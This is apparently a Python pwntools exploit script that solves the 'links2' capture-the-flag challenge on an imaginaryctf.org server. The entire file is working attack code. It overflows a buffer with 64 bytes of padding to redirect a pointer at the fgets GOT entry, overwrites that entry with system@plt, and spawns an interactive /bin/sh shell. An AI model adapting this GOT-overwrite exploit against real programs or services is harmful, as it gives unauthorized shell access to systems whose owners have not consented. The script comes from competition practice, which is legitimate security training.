from pwn import *

def write_data(exploit,pos):
    r.sendlineafter('>>> ' ,'2')
    r.sendlineafter('>>> ' ,pos)
    r.sendlineafter('>>> ' ,exploit)
r = remote("puzzler7.imaginaryctf.org" ,2007)
#r = process("./links2")
e = ELF("./links2")
write_data(b"/bin/sh","0")
write_data(b"pugal","1")
write_data(b'jo',"2")
r.sendlineafter('>>> ' ,'3')
exploit = b"A" * 64 + p64(e.got.fgets) 
write_data(exploit,"1")
write_data(p64(e.plt.system),"2")
r.sendlineafter('>>> ' ,'2')
r.sendlineafter('>>> ' ,'0')
r.interactive()
